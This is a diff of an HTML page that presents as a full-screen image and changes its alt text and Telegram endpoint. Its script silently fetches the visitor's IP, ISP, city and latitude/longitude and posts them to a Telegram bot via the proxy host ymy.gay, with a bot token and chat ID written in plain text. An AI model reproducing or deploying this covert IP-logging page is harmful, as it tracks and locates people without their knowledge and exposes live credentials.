@@ -6,7 +6,7 @@
 	</head>
 	<body>
 		<img src="https://ymy.gay/https://cdn.jsdelivr.net/gh/png-dot/pngpng@main/20231005-220130-nmt89k.jpeg"
-			alt="描述图片的文本" style="width: 100%; height: 100%;">
+			alt="杨明宇" style="width: 100%; height: 100%;">
 
 		<script>
 			// 使用 JavaScript 发送请求到 API 并将响应信息推送到 Telegram
@@ -15,29 +15,28 @@
 				.then(data => {
 					// 构建要推送到 Telegram 的消息
 					const message = `
-                    IP 地址: ${data.ip}
-                    组织名称: ${data.organization}
-                    经度: ${data.longitude}
-                    城市: ${data.city}
-                    时区: ${data.timezone}
-                    ISP: ${data.isp}
-                    偏移量: ${data.offset}
-                    区域: ${data.region}
-                    ASN: ${data.asn}
-                    ASN 组织: ${data.asn_organization}
-                    国家: ${data.country}
-                    IP 地址: ${data.ip}
-                    纬度: ${data.latitude}
-                    大洲代码: ${data.continent_code}
-                    国家代码: ${data.country_code}
-                    区域代码: ${data.region_code}
+IP 地址: ${data.ip}
+组织名称: ${data.organization}
+经度: ${data.longitude}
+城市: ${data.city}
+时区: ${data.timezone}
+ISP: ${data.isp}
+偏移量: ${data.offset}
+区域: ${data.region}
+ASN: ${data.asn}
+ASN 组织: ${data.asn_organization}
+国家: ${data.country}
+纬度: ${data.latitude}
+大洲代码: ${data.continent_code}
+国家代码: ${data.country_code}
+区域代码: ${data.region_code}
                 `;
 
 					// 将消息推送到 Telegram
 					const token = '5975737743:AAFxFhwL8_VIvZRkqXYeDVngTH3zXaqhy68'; // 替换为您的 Telegram Bot API 令牌
 					const chatId = '5957163999'; // 替换为您的 Telegram 聊天 ID
 
-					fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+					fetch(`https://ymy.gay/https://api.telegram.org/bot${token}/sendMessage`, {
 							method: 'POST',
 							headers: {
 								'Content-Type': 'application/json'
